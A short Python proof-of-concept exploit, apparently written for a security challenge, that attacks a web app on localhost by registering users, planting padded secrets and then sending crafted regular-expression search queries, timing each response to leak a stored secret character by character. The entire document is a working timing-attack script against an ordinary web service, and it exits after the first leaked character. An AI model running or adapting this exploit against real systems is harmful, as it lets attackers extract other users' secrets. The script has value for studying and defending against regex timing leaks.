#!/usr/bin/env python3

"""
This PoC demonstrates how the timing attack is possible in same-site context (no XS-Leaks),
where the user attacking is the same inserting the secret to his account.
"""

import time
import requests
import string


URL = "http://localhost:3000"
SECRET = ""
FIRST_PAYLOAD = r"^"
SECOND_PAYLOAD = r"(.+){21}$"

s = requests.Session()
# registering a user
for _ in range(11):
    s.post(URL + "/register")

# adding a secret
s.post(
    URL + "/add",
    json={
        "secret": "averylooooooooooooooooooooooong",
    },
).text
s.post(URL + "/add", json={"secret": "a", "isPrivate": False})

s.post(
    URL + "/add",
    json={
        "secret": "a" * 168
        + "%s\x00",
        # + (FIRST_PAYLOAD + (SECRET + char) + SECOND_PAYLOAD) + "\x00",
        "secretOffset": 1,
    },
).text

try:
    while True:
        for char in string.ascii_lowercase + string.ascii_uppercase  + string.digits:
            # searching for the added secret
            t = time.time()
            s.get(URL + "/search", params={"query": (FIRST_PAYLOAD + SECRET + char + SECOND_PAYLOAD)})
            if time.time() - t > 0.3:
                SECRET += char
                print("[+] Leaked first character of the secret:", SECRET)
                exit(1)
                break
        else:
            break
except Exception as e:
    print("[-] Error while trying to leak secret:", e)
